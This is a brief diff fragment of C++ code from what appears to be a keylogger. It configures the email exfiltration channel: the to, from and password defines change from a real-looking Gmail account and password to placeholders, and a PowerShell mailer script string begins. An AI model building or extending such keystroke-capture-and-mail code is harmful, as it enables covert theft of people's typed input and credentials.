@@ -11,9 +11,9 @@
 namespace Mail
 {
 
-    #define X_EM_TO "keylogger.cypher@gmail.com"
-    #define X_EM_FROM "keylogger.cypher@gmail.com"
-    #define X_EM_PASS "keylogger225"
+    #define X_EM_TO "email"
+    #define X_EM_FROM "email"
+    #define X_EM_PASS "password"
 
 const std::string &PowerShellScript =
 "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
